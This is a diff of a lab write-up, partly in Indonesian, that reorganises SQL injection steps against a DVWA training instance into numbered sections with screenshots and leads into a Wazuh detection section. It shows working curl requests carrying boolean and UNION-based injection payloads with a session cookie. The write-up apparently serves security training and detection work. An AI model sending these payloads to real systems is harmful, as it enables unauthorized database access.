@@ -14,19 +14,36 @@ ke dalam input aplikasi untuk memanipulasi database.
 - Security Level: Low
 
 ## Attack Commands
-```bash
-# Setup session
-SESS="PHPSESSID=MY_SESSION; security=low"
-![Step 1](screenshots/Screenshot_2026-04-10_11_44_23.png)
 
-# Basic SQL Injection
+### Step 1: Setup Session
+
+```bash
+SESS="PHPSESSID=MY_SESSION; security=low"
+```
+
+![Step 1 - Setup Session](Screenshot 2026-04-10 120522.png)
+
+---
+
+### Step 2: Basic SQL Injection
+
+```bash
 curl -s "http://192.168.217.130/DVWA/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
   -b "$SESS"
+```
 
-# UNION Based SQL Injection
+![Step 2 - Basic SQL Injection](Screenshot_2026-04-10_11_44_09.png)
+
+---
+
+### Step 3: UNION Based SQL Injection
+
+```bash
 curl -s "http://192.168.217.130/DVWA/vulnerabilities/sqli/?id=1+union+select+1,2--&Submit=Submit" \
   -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
 ```
+
+![Step 3 - UNION Based](Screenshot 2026-04-10 120914.png)
 
 ## Detection
 - Tool: Wazuh Custom Rules
